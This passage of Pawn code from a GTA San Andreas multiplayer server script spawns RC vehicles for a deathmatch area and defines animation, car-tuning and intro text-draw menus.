    lockedveh[0] = AddStaticVehicle(437,2487.4268,1305.0060,10.9537,93.2321,-1,-1); // c1 (dm 0)
	lockedveh[1] = AddStaticVehicle(437,2507.6975,1304.7847,10.9536,269.6930,-1,-1); // c2 (dm 0)
	lockedveh[2] = AddStaticVehicle(437,2507.6357,1261.7097,10.9536,90.0906,-1,-1); // c3 (dm 0)
	lockedveh[3] = AddStaticVehicle(437,2487.4854,1261.6997,10.9537,90.1342,-1,-1); // c4 (dm 0)
	SetVehicleVirtualWorld(lockedveh[0], WORLDID_DM);
	SetVehicleVirtualWorld(lockedveh[1], WORLDID_DM);
	SetVehicleVirtualWorld(lockedveh[2], WORLDID_DM);
	SetVehicleVirtualWorld(lockedveh[3], WORLDID_DM);

	rcbandit[0] = AddStaticVehicle(441,-972.8682,1062.2438,1344.7847,90.8054,-1,-1); // mini racecars (dm 10)
	rcbandit[1] = AddStaticVehicle(441,-972.8491,1061.0818,1344.7922,90.1331,-1,-1);
	rcbandit[2] = AddStaticVehicle(441,-972.7922,1059.9102,1344.7957,90.3595,-1,-1);
	rcbandit[3] = AddStaticVehicle(441,-974.4999,1059.9004,1344.7942,90.3918,-1,-1);
	rcbandit[4] = AddStaticVehicle(441,-974.6201,1061.0795,1344.7971,90.0972,-1,-1);
	rcbandit[5] = AddStaticVehicle(441,-974.6087,1062.2230,1344.7915,90.6449,-1,-1);
	rcbandit[6] = AddStaticVehicle(441,-976.2573,1062.2047,1344.7963,90.6102,-1,-1);
	rcbandit[7] = AddStaticVehicle(441,-976.1952,1059.8892,1344.7941,90.3961,-1,-1);
	rcbandit[8] = AddStaticVehicle(441,-976.2254,1061.0685,1344.7941,90.6396,-1,-1);
	LinkVehicleToInterior(rcbandit[0], 10);
	LinkVehicleToInterior(rcbandit[1], 10);
	LinkVehicleToInterior(rcbandit[2], 10);
	LinkVehicleToInterior(rcbandit[3], 10);
	LinkVehicleToInterior(rcbandit[4], 10);
	LinkVehicleToInterior(rcbandit[5], 10);
	LinkVehicleToInterior(rcbandit[6], 10);
	LinkVehicleToInterior(rcbandit[7], 10);
	LinkVehicleToInterior(rcbandit[8], 10);
	SetVehicleVirtualWorld(rcbandit[0], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[1], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[2], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[3], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[4], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[5], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[6], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[7], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[8], WORLDID_DM);

	rcbandit[9] = AddStaticVehicle(441,-1132.5616,1056.8306,1345.5269,271.0319,-1,-1); // mini racecars - other side (dm 10)
	rcbandit[10] = AddStaticVehicle(441,-1130.8533,1056.8110,1345.5348,269.5184,-1,-1);
	rcbandit[11] = AddStaticVehicle(441,-1129.0355,1056.8170,1345.5370,271.7242,-1,-1);
	rcbandit[12] = AddStaticVehicle(441,-1132.6211,1057.8469,1345.5331,271.4053,-1,-1);
	rcbandit[13] = AddStaticVehicle(441,-1130.7272,1057.8572,1345.5367,269.1559,-1,-1);
	rcbandit[14] = AddStaticVehicle(441,-1129.0981,1057.8622,1345.5364,272.2809,-1,-1);
	rcbandit[15] = AddStaticVehicle(441,-1132.6215,1058.8352,1345.5375,272.0467,-1,-1);
	rcbandit[16] = AddStaticVehicle(441,-1130.8942,1058.8981,1345.5363,272.1089,-1,-1);
	rcbandit[17] = AddStaticVehicle(441,-1129.2161,1058.9604,1345.5363,272.1075,-1,-1);
	LinkVehicleToInterior(rcbandit[9], 10);
	LinkVehicleToInterior(rcbandit[10], 10);
	LinkVehicleToInterior(rcbandit[11], 10);
	LinkVehicleToInterior(rcbandit[12], 10);
	LinkVehicleToInterior(rcbandit[13], 10);
	LinkVehicleToInterior(rcbandit[14], 10);
	LinkVehicleToInterior(rcbandit[15], 10);
	LinkVehicleToInterior(rcbandit[16], 10);
	LinkVehicleToInterior(rcbandit[17], 10);
	SetVehicleVirtualWorld(rcbandit[9], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[10], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[11], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[12], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[13], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[14], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[15], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[16], WORLDID_DM);
	SetVehicleVirtualWorld(rcbandit[17], WORLDID_DM);

	rcgoblin[0] = AddStaticVehicle(501,-976.1449,1074.8285,1344.1056,91.9723,-1,-1); // red mini helis (dm 10)
	rcgoblin[1] = AddStaticVehicle(501,-971.3365,1074.9022,1344.1327,89.1962,-1,-1);
	rcgoblin[2] = AddStaticVehicle(501,-976.1312,1079.6720,1344.0964,89.3900,-1,-1);
	rcgoblin[3] = AddStaticVehicle(501,-971.3988,1079.6407,1344.1289,89.2793,-1,-1);
	LinkVehicleToInterior(rcgoblin[0], 10);
	LinkVehicleToInterior(rcgoblin[1], 10);
	LinkVehicleToInterior(rcgoblin[2], 10);
	LinkVehicleToInterior(rcgoblin[3], 10);
	SetVehicleVirtualWorld(rcgoblin[0], WORLDID_DM);
	SetVehicleVirtualWorld(rcgoblin[1], WORLDID_DM);
	SetVehicleVirtualWorld(rcgoblin[2], WORLDID_DM);
	SetVehicleVirtualWorld(rcgoblin[3], WORLDID_DM);

	rcgoblin[4] = AddStaticVehicle(501,-1134.5748,1044.4640,1344.8818,269.7650,-1,-1); // red mini helis - other side (dm 10)
	rcgoblin[5] = AddStaticVehicle(501,-1128.7430,1044.4667,1344.8435,270.0057,-1,-1);
	rcgoblin[6] = AddStaticVehicle(501,-1134.5674,1038.8414,1344.8763,270.5409,-1,-1);
	rcgoblin[7] = AddStaticVehicle(501,-1128.7269,1038.8951,1344.8379,270.5187,-1,-1);
	LinkVehicleToInterior(rcgoblin[4], 10);
	LinkVehicleToInterior(rcgoblin[5], 10);
	LinkVehicleToInterior(rcgoblin[6], 10);
	LinkVehicleToInterior(rcgoblin[7], 10);
	SetVehicleVirtualWorld(rcgoblin[4], WORLDID_DM);
	SetVehicleVirtualWorld(rcgoblin[5], WORLDID_DM);
	SetVehicleVirtualWorld(rcgoblin[6], WORLDID_DM);
	SetVehicleVirtualWorld(rcgoblin[7], WORLDID_DM);

	rcraider[0] = AddStaticVehicle(465,-974.8157,1076.7621,1344.1075,90.5410,-1,-1); // green mini helis (dm 10)
	rcraider[1] = AddStaticVehicle(465,-974.8152,1077.5833,1344.1069,90.3496,-1,-1);
	LinkVehicleToInterior(rcraider[0], 10);
	LinkVehicleToInterior(rcraider[1], 10);
	SetVehicleVirtualWorld(rcraider[0], WORLDID_DM);
	SetVehicleVirtualWorld(rcraider[1], WORLDID_DM);

	rcraider[2] = AddStaticVehicle(465,-1130.6302,1041.3104,1344.8529,270.4719,-1,-1); // green mini helis - other side (dm 10)
	rcraider[3] = AddStaticVehicle(465,-1130.6053,1042.1537,1344.8535,270.2663,-1,-1);
	LinkVehicleToInterior(rcraider[2], 10);
	LinkVehicleToInterior(rcraider[3], 10);
	SetVehicleVirtualWorld(rcraider[2], WORLDID_DM);
	SetVehicleVirtualWorld(rcraider[3], WORLDID_DM);

	rctiger[0] = AddStaticVehicle(564,-973.9993,1087.9646,1344.1766,89.8596,-1,-1); // mini tanks (dm 10)
	rctiger[1] = AddStaticVehicle(564,-973.9723,1091.3099,1344.1752,90.7019,-1,-1);
	rctiger[2] = AddStaticVehicle(564,-976.1476,1090.4761,1344.1411,88.8514,-1,-1);
	rctiger[3] = AddStaticVehicle(564,-974.0242,1089.6067,1344.1759,88.8326,-1,-1);
	rctiger[4] = AddStaticVehicle(564,-976.1071,1088.8075,1344.1415,89.7702,-1,-1);
	rctiger[5] = AddStaticVehicle(564,-977.9354,1089.6538,1344.1356,88.3154,-1,-1);
	LinkVehicleToInterior(rctiger[0], 10);
	LinkVehicleToInterior(rctiger[1], 10);
	LinkVehicleToInterior(rctiger[2], 10);
	LinkVehicleToInterior(rctiger[3], 10);
	LinkVehicleToInterior(rctiger[4], 10);
	LinkVehicleToInterior(rctiger[5], 10);
	SetVehicleVirtualWorld(rctiger[0], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[1], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[2], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[3], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[4], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[5], WORLDID_DM);

	rctiger[6] = AddStaticVehicle(564,-1130.0457,1029.2214,1344.8933,269.1673,-1,-1); // mini tanks - other side (dm 10)
	rctiger[7] = AddStaticVehicle(564,-1131.6599,1028.4617,1344.9042,269.1953,-1,-1);
	rctiger[8] = AddStaticVehicle(564,-1133.4265,1027.6833,1344.9301,271.0876,-1,-1);
	rctiger[9] = AddStaticVehicle(564,-1131.6053,1030.0112,1344.9254,269.1981,-1,-1);
	rctiger[10] = AddStaticVehicle(564,-1133.4321,1030.7161,1344.9121,269.7441,-1,-1);
	rctiger[11] = AddStaticVehicle(564,-1133.4324,1029.3087,1344.9435,268.9245,-1,-1);
	LinkVehicleToInterior(rctiger[6], 10);
	LinkVehicleToInterior(rctiger[7], 10);
	LinkVehicleToInterior(rctiger[8], 10);
	LinkVehicleToInterior(rctiger[9], 10);
	LinkVehicleToInterior(rctiger[10], 10);
	LinkVehicleToInterior(rctiger[11], 10);
	SetVehicleVirtualWorld(rctiger[6], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[7], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[8], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[9], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[10], WORLDID_DM);
	SetVehicleVirtualWorld(rctiger[11], WORLDID_DM);

	rccam[0] = AddStaticVehicle(594,-980.8004,1089.7864,1344.1329,89.8502,-1,-1); // flowerpot (dm 10)
	rccam[1] = AddStaticVehicle(594,-980.8019,1091.1827,1344.1359,89.4264,-1,-1);
	rccam[2] = AddStaticVehicle(594,-980.7939,1088.1029,1344.1324,89.1476,-1,-1);
	LinkVehicleToInterior(rccam[0], 10);
	LinkVehicleToInterior(rccam[1], 10);
	LinkVehicleToInterior(rccam[2], 10);
	SetVehicleVirtualWorld(rccam[0], WORLDID_DM);
	SetVehicleVirtualWorld(rccam[1], WORLDID_DM);
	SetVehicleVirtualWorld(rccam[2], WORLDID_DM);

	rccam[3] = AddStaticVehicle(594,-1124.7332,1029.2094,1344.8745,269.6438,-1,-1); // flowerpot - other side (dm 10)
	rccam[4] = AddStaticVehicle(594,-1124.6187,1030.8485,1344.8718,270.7772,-1,-1);
	rccam[5] = AddStaticVehicle(594,-1124.6628,1027.3010,1344.8756,271.5269,-1,-1);
	LinkVehicleToInterior(rccam[3], 10);
	LinkVehicleToInterior(rccam[4], 10);
	LinkVehicleToInterior(rccam[5], 10);
	SetVehicleVirtualWorld(rccam[3], WORLDID_DM);
	SetVehicleVirtualWorld(rccam[4], WORLDID_DM);
	SetVehicleVirtualWorld(rccam[5], WORLDID_DM);

	rcbaron[3] = AddStaticVehicle(464,-973.0820,1089.7129,1351.0,91.1964,-1,-1); // mini airplane (dm 10)
	rcbaron[4] = AddStaticVehicle(464,-974.2630,1089.6932,1351.0,91.1964,-1,-1);
	rcbaron[5] = AddStaticVehicle(464,-975.2630,1089.6932,1351.0,91.1964,-1,-1);
	LinkVehicleToInterior(rcbaron[3], 10);
	LinkVehicleToInterior(rcbaron[4], 10);
	LinkVehicleToInterior(rcbaron[5], 10);
	SetVehicleVirtualWorld(rcbaron[3], WORLDID_DM);
	SetVehicleVirtualWorld(rcbaron[4], WORLDID_DM);
	SetVehicleVirtualWorld(rcbaron[5], WORLDID_DM);

	rcbaron[0] = AddStaticVehicle(464,-1133.4861,1029.0660,1351.0,271.2148,-1,-1); // mini airplane - other side (dm 10)
	rcbaron[1] = AddStaticVehicle(464,-1132.4861,1029.0660,1351.0,271.2148,-1,-1);
	rcbaron[2] = AddStaticVehicle(464,-1131.4861,1029.0660,1351.0,271.2148,-1,-1);
	LinkVehicleToInterior(rcbaron[0], 10);
	LinkVehicleToInterior(rcbaron[1], 10);
	LinkVehicleToInterior(rcbaron[2], 10);
	SetVehicleVirtualWorld(rcbaron[0], WORLDID_DM);
	SetVehicleVirtualWorld(rcbaron[1], WORLDID_DM);
	SetVehicleVirtualWorld(rcbaron[2], WORLDID_DM);

//----------------------ActionMenu---------------------------
  	ActionMenu = CreateMenu("Actions",1,25,210,175,50);
	SetMenuColumnHeader(ActionMenu,0, "Actions Menu");
	AddMenuItem(ActionMenu,0, "Skate anims");
	AddMenuItem(ActionMenu,0, "Swim anims");
	AddMenuItem(ActionMenu,0, "Dance anims");
	AddMenuItem(ActionMenu,0, "Strip anims");
	AddMenuItem(ActionMenu,0, "Drunk anims");
	AddMenuItem(ActionMenu,0, "Fuck you anims");
	AddMenuItem(ActionMenu,0, "Handsup anims");
	AddMenuItem(ActionMenu,0, "Smoke anims");
	AddMenuItem(ActionMenu,0, "Weird anims");
	AddMenuItem(ActionMenu,0, "Exit");

//-----------------------SkateMenu---------------------------
	SkateMenu = CreateMenu("Skate",2,25,210,175,50);
	SetMenuColumnHeader(SkateMenu,0, "Skate menu");
	AddMenuItem(SkateMenu,0, "Skate A");
	AddMenuItem(SkateMenu,0, "Skate B");
	AddMenuItem(SkateMenu,0, "Skate C");
	AddMenuItem(SkateMenu,0, "Exit menu");

	SetMenuColumnHeader(SkateMenu,1, "Description");
	AddMenuItem(SkateMenu,1, "Slow");
	AddMenuItem(SkateMenu,1, "Fast");
	AddMenuItem(SkateMenu,1, "Idle");
	AddMenuItem(SkateMenu,1, "Close menu");

//-----------------------SwimMenu---------------------------
	SwimMenu = CreateMenu("Swim",2,25,210,175,50);
	SetMenuColumnHeader(SwimMenu,0, "Swim menu");
	AddMenuItem(SwimMenu,0, "Swim A");
	AddMenuItem(SwimMenu,0, "Swim B");
	AddMenuItem(SwimMenu,0, "Swim C");
	AddMenuItem(SwimMenu,0, "Exit menu");

	SetMenuColumnHeader(SwimMenu,1, "Description");
	AddMenuItem(SwimMenu,1, "Slow");
	AddMenuItem(SwimMenu,1, "Fast");
	AddMenuItem(SwimMenu,1, "Idle");
	AddMenuItem(SwimMenu,1, "Close menu");

//-----------------------DanceMenu1---------------------------
	DanceMenu1 = CreateMenu("Dance",2,25,210,175,50);
	SetMenuColumnHeader(DanceMenu1,0, "Dance menu 1");
	AddMenuItem(DanceMenu1,0, "Dance A");
	AddMenuItem(DanceMenu1,0, "Dance B");
	AddMenuItem(DanceMenu1,0, "Dance C");
	AddMenuItem(DanceMenu1,0, "Dance D");
	AddMenuItem(DanceMenu1,0, "Dance E");
	AddMenuItem(DanceMenu1,0, "Dance F");
	AddMenuItem(DanceMenu1,0, "Dance G");
	AddMenuItem(DanceMenu1,0, "Dance H");
	AddMenuItem(DanceMenu1,0, "Dance I");
	AddMenuItem(DanceMenu1,0, "Next dance menu");

	/*SetMenuColumnHeader(DanceMenu1,1, "Description");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "unknown");
	AddMenuItem(DanceMenu1,1, "next dance menu");*/

//-----------------------DanceMenu2---------------------------
	DanceMenu2 = CreateMenu("Dance",2,25,210,175,50);
	SetMenuColumnHeader(DanceMenu2,0, "Dance menu 2");
	AddMenuItem(DanceMenu2,0, "Dance J");
	AddMenuItem(DanceMenu2,0, "Dance K");
	AddMenuItem(DanceMenu2,0, "Dance L");
	AddMenuItem(DanceMenu2,0, "Dance M");
	AddMenuItem(DanceMenu2,0, "Dance 1");
	AddMenuItem(DanceMenu2,0, "Dance 2");
	AddMenuItem(DanceMenu2,0, "Dance 3");
	AddMenuItem(DanceMenu2,0, "Exit menu");

	/*SetMenuColumnHeader(DanceMenu2,1, "Description");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "unknown");
	AddMenuItem(DanceMenu2,1, "Close menu");*/

//-----------------------StripMenu1---------------------------
	StripMenu1 = CreateMenu("Dance",2,25,210,175,50);
	SetMenuColumnHeader(StripMenu1,0, "Strip menu 1");
	AddMenuItem(StripMenu1,0, "Strip A");
	AddMenuItem(StripMenu1,0, "Strip B");
	AddMenuItem(StripMenu1,0, "Strip C");
	AddMenuItem(StripMenu1,0, "Strip D");
	AddMenuItem(StripMenu1,0, "Strip E");
	AddMenuItem(StripMenu1,0, "Strip F");
	AddMenuItem(StripMenu1,0, "Strip G");
	AddMenuItem(StripMenu1,0, "Strip H");
	AddMenuItem(StripMenu1,0, "Strip I");
	AddMenuItem(StripMenu1,0, "Next strip menu");

	/*SetMenuColumnHeader(StripMenu1,1, "Description");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "unknown");
	AddMenuItem(StripMenu1,1, "Next strip menu");*/

//-----------------------StripMenu2---------------------------
	StripMenu2 = CreateMenu("Striptease",2,25,210,175,50);
	SetMenuColumnHeader(StripMenu2,0, "Strip menu 2");
	AddMenuItem(StripMenu2,0, "Strip J");
	AddMenuItem(StripMenu2,0, "Strip K");
	AddMenuItem(StripMenu2,0, "Strip L");
	AddMenuItem(StripMenu2,0, "Strip M");
	AddMenuItem(StripMenu2,0, "Strip N");
	AddMenuItem(StripMenu2,0, "Strip O");
	AddMenuItem(StripMenu2,0, "Strip P");
	AddMenuItem(StripMenu2,0, "Strip Q");
	AddMenuItem(StripMenu2,0, "Strip R");
	AddMenuItem(StripMenu2,0, "Exit menu");

	/*SetMenuColumnHeader(StripMenu2,1, "Description");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "unknown");
	AddMenuItem(StripMenu2,1, "Close menu");*/

//-----------------------FuckyouMenu---------------------------
	FuckyouMenu = CreateMenu("Fuck you",2,25,210,175,50);
	SetMenuColumnHeader(FuckyouMenu,0, "Fuck you menu");
	AddMenuItem(FuckyouMenu,0, "Fuck you A");
	AddMenuItem(FuckyouMenu,0, "Fuck you B");
	AddMenuItem(FuckyouMenu,0, "Exit menu");

	SetMenuColumnHeader(FuckyouMenu,1, "Description");
	AddMenuItem(FuckyouMenu,1, "fast");
	AddMenuItem(FuckyouMenu,1, "slow");
	AddMenuItem(FuckyouMenu,1, "Close menu");

//-----------------------HandsupMenu---------------------------
	HandsupMenu = CreateMenu("Handsup",2,25,210,175,50);
	SetMenuColumnHeader(HandsupMenu,0, "Handsup menu");
	AddMenuItem(HandsupMenu,0, "Handsup A");
	AddMenuItem(HandsupMenu,0, "Handsup B");
	AddMenuItem(HandsupMenu,0, "Exit menu");

	SetMenuColumnHeader(HandsupMenu,1, "Description");
	AddMenuItem(HandsupMenu,1, "fast");
	AddMenuItem(HandsupMenu,1, "slow");
	AddMenuItem(HandsupMenu,1, "Close menu");

//-----------------------SmokeMenu---------------------------
	SmokeMenu = CreateMenu("Dance",2,25,210,175,50);
	SetMenuColumnHeader(SmokeMenu,0, "Smoke menu");
	AddMenuItem(SmokeMenu,0, "Smoke A");
	AddMenuItem(SmokeMenu,0, "Smoke B");
	AddMenuItem(SmokeMenu,0, "Smoke C");
	AddMenuItem(SmokeMenu,0, "Smoke D");
	AddMenuItem(SmokeMenu,0, "Exit menu");

	SetMenuColumnHeader(SmokeMenu,1, "Description");
	AddMenuItem(SmokeMenu,1, "Buy cigarette");
	AddMenuItem(SmokeMenu,1, "Lean on wall");
	AddMenuItem(SmokeMenu,1, "Smoke as driver");
	AddMenuItem(SmokeMenu,1, "Smoke as passenger");
	AddMenuItem(SmokeMenu,1, "Close menu");

//-----------------------WeirdMenu---------------------------
	WeirdMenu = CreateMenu("Dance",2,25,210,175,50);
	SetMenuColumnHeader(WeirdMenu,0, "Smoke menu");
	AddMenuItem(WeirdMenu,0, "Weird A");
	AddMenuItem(WeirdMenu,0, "Weird B");
	AddMenuItem(WeirdMenu,0, "Weird C");
	AddMenuItem(WeirdMenu,0, "Weird D");
	AddMenuItem(WeirdMenu,0, "Weird E");
	AddMenuItem(WeirdMenu,0, "Exit menu");

	SetMenuColumnHeader(WeirdMenu,1, "Description");
	AddMenuItem(WeirdMenu,1, "unknown");
	AddMenuItem(WeirdMenu,1, "unknown");
	AddMenuItem(WeirdMenu,1, "unknown");
	AddMenuItem(WeirdMenu,1, "unknown");
	AddMenuItem(WeirdMenu,1, "unknown");
	AddMenuItem(WeirdMenu,1, "Close menu");

//-======================Tuning Menu=====================
	TuningMenu = CreateMenu("Tuning",1,25,210,175,50);
	SetMenuColumnHeader(TuningMenu,0, "Description");
	AddMenuItem(TuningMenu,0, "Single color");
	AddMenuItem(TuningMenu,0, "Two colors");
	AddMenuItem(TuningMenu,0, "Nitro");
	AddMenuItem(TuningMenu,0, "Wheels");
	AddMenuItem(TuningMenu,0, "Hydraulics");
	AddMenuItem(TuningMenu,0, "Paintjob");
	AddMenuItem(TuningMenu,0, "Stereo boost");
	AddMenuItem(TuningMenu,0, "Close menu");

	//  Single Color
	SCMenu = CreateMenu("Single color",1,25,210,175,50);
	SetMenuColumnHeader(SCMenu,0, "Description");
	AddMenuItem(SCMenu,0, "White");
	AddMenuItem(SCMenu,0, "Yellow");
	AddMenuItem(SCMenu,0, "Pink");
	AddMenuItem(SCMenu,0, "Red");
	AddMenuItem(SCMenu,0, "Green");
	AddMenuItem(SCMenu,0, "Purple");
	AddMenuItem(SCMenu,0, "Blue");
	AddMenuItem(SCMenu,0, "Grey");
	AddMenuItem(SCMenu,0, "Black");
	AddMenuItem(SCMenu,0, "back to Main menu");

	//  Two Colors 1
	TC1Menu = CreateMenu("Two colors",1,25,210,175,50);
	SetMenuColumnHeader(TC1Menu,0, "Pick first car color");
	AddMenuItem(TC1Menu,0, "White");
	AddMenuItem(TC1Menu,0, "Yellow");
	AddMenuItem(TC1Menu,0, "Pink");
	AddMenuItem(TC1Menu,0, "Red");
	AddMenuItem(TC1Menu,0, "Green");
	AddMenuItem(TC1Menu,0, "Purple");
	AddMenuItem(TC1Menu,0, "Blue");
	AddMenuItem(TC1Menu,0, "Grey");
	AddMenuItem(TC1Menu,0, "Black");
	AddMenuItem(TC1Menu,0, "Back to main menu");

	//  Two Colors 2
	TC2Menu = CreateMenu("Two colors",1,25,210,175,50);
	SetMenuColumnHeader(TC2Menu,0, "Pick second car color");
	AddMenuItem(TC2Menu,0, "White");
	AddMenuItem(TC2Menu,0, "Yellow");
	AddMenuItem(TC2Menu,0, "Pink");
	AddMenuItem(TC2Menu,0, "Red");
	AddMenuItem(TC2Menu,0, "Green");
	AddMenuItem(TC2Menu,0, "Purple");
	AddMenuItem(TC2Menu,0, "Blue");
	AddMenuItem(TC2Menu,0, "Grey");
	AddMenuItem(TC2Menu,0, "Black");
	AddMenuItem(TC2Menu,0, "Back to previous menu");

	//  Nitro
	NMenu = CreateMenu("Nitro",1,25,210,175,35);
	SetMenuColumnHeader(NMenu,0, "Description");
	AddMenuItem(NMenu,0, "2x Nitro");
	AddMenuItem(NMenu,0, "5x Nitro");
	AddMenuItem(NMenu,0, "10x Nitro");
	AddMenuItem(NMenu,0, "Back to main menu");

	//  Wheels
	WMenu = CreateMenu("Wheels",1,250,210,125,50);
	SetMenuColumnHeader(WMenu,0, "Description");
	AddMenuItem(WMenu,0, "Offroad");
	AddMenuItem(WMenu,0, "Shadow");
	AddMenuItem(WMenu,0, "Mega");
	AddMenuItem(WMenu,0, "Rimshine");
	AddMenuItem(WMenu,0, "Wires");
	AddMenuItem(WMenu,0, "Classic");
	AddMenuItem(WMenu,0, "Twist");
	AddMenuItem(WMenu,0, "Cutter");
	AddMenuItem(WMenu,0, "Go to next wheel menu");
	AddMenuItem(WMenu,0, "Back to main menu");

	W2Menu = CreateMenu("Wheels",1,250,210,125,50);
	SetMenuColumnHeader(W2Menu,0, "Description");
	AddMenuItem(W2Menu,0, "Switch");
	AddMenuItem(W2Menu,0, "Grove");
	AddMenuItem(W2Menu,0, "Import");
	AddMenuItem(W2Menu,0, "Dollar");
	AddMenuItem(W2Menu,0, "Trance");
	AddMenuItem(W2Menu,0, "Atomic");
	AddMenuItem(W2Menu,0, "Ahab");
	AddMenuItem(W2Menu,0, "Virtual");
	AddMenuItem(W2Menu,0, "Access");
	AddMenuItem(W2Menu,0, "Back to main menu");

	//  Paintjobs
	PMenu = CreateMenu("Paintjobs",1,225,300,175,35);
	SetMenuColumnHeader(PMenu,0, "Description");
	AddMenuItem(PMenu,0, "Paintjob 1");
	AddMenuItem(PMenu,0, "Paintjob 2");
	AddMenuItem(PMenu,0, "Paintjob 3");
	AddMenuItem(PMenu,0, "Back to main menu");

//===========================TEXT DRAWS(intro)======================
	/*title = TextDrawCreate(300.0, 100.0, "x~y~Mo~b~vi~r~e");
	TextDrawColor(title, COLOR_LIME);
	TextDrawLetterSize(title, 0.7, 2.0);
	//TextDrawUseBox(title, 1);
	//TextDrawTextSize(title, 10.0, 400.0);
	TextDrawAlignment(title, 2);
	TextDrawSetShadow(title, 0);
	TextDrawFont(title, 0);
	//TextDrawBoxColor(title, COLOR_BLACK);*/

	/*info = TextDrawCreate(300.0, 125.0, "---==[ INFO ]==---~n~~n~xxx~n~~n~~w~/maphelp - build with friends in 1 map ~n~~n~~n~~n~~n~~r~test");
	TextDrawColor(info, COLOR_FLBLUE);
	TextDrawLetterSize(info, 0.5, 1.0);
	TextDrawUseBox(info, 1);
	TextDrawTextSize(info, 10.0, 400.0);
	TextDrawAlignment(info, 2);
	TextDrawSetShadow(info, 0);
	TextDrawFont(info, 1);
	TextDrawBoxColor(info, COLOR_BLACK);*/

	/*rules = TextDrawCreate(100.0, 125.0, "                      ---==[ RULES ] ==--- ~n~~n~~r~| Instant ban: hacking and/or cheating~n~| Bans: 3rd kick or disrespect against players~n~~y~| Kicks: 2nd warning, heavy DMing, spam or disrespect");
	TextDrawColor(rules, COLOR_LLBLUE);
	TextDrawLetterSize(rules, 0.4, 1.0);
	TextDrawAlignment(rules, 1);
	TextDrawSetShadow(rules, 0);
	TextDrawFont(rules, 1);

	rules2 = TextDrawCreate(100.0, 161.0, "~n~~y~| Others: disrespect, DMing, spam of any kind~n~~w~| CLEO: no flying look-like mods allowed~n~| Creating useless things = ban~n~~b~| Exeptions: interactive mods are allowed (no abuse)");
	TextDrawColor(rules2, COLOR_FLBLUE);
	TextDrawLetterSize(rules2, 0.4, 1.0);
	TextDrawAlignment(rules2, 1);
	TextDrawSetShadow(rules2, 0);
	TextDrawFont(rules2, 1);

	credits = TextDrawCreate(300.0, 425.0, "www.xmovieserver.com");
	TextDrawLetterSize(credits, 0.5, 1.0);
	TextDrawAlignment(credits, 2);
	TextDrawSetShadow(credits, 0);
	TextDrawFont(credits, 3);*/

	/*introhalloween = TextDrawCreate(320.000000, 16.000000, "Happy Halloween from all at xMovie!");
	TextDrawAlignment(introhalloween, 2);
	TextDrawBackgroundColor(introhalloween, 255);
	TextDrawFont(introhalloween, 1);
	TextDrawLetterSize(introhalloween, 0.529999, 1.500000);
	TextDrawColor(introhalloween, -172490497);
	TextDrawSetOutline(introhalloween, 1);
	TextDrawSetProportional(introhalloween, 1);
	TextDrawUseBox(introhalloween, 1);
	TextDrawBoxColor(introhalloween, 255);
	TextDrawTextSize(introhalloween, 40.000000, 375.000000);*/

	/*intro1 = TextDrawCreate(1.000000, 411.000000, "-");
	TextDrawFont(intro1, 1);
	TextDrawLetterSize(intro1, 0.000000, 1.600000);
	TextDrawSetProportional(intro1, 1);
	TextDrawUseBox(intro1, 1);
	TextDrawBoxColor(intro1, 0x000000AA);
	TextDrawTextSize(intro1, 639.000000, 384.000000);*/

	intro1 = TextDrawCreate(1.000000, 432.000000, "-");
	TextDrawFont(intro1, 1);
	TextDrawLetterSize(intro1, 0.000000, 1.600000);
	TextDrawSetProportional(intro1, 1);
	TextDrawUseBox(intro1, 1);
	TextDrawBoxColor(intro1, 0x000000AA);
	TextDrawTextSize(intro1, 639.000000, 384.000000);

	/*intro3 = TextDrawCreate(420.000000, 409.000000, "xMovie Server");
	//TextDrawBackgroundColor(intro3, 255);
	TextDrawFont(intro3, 1);
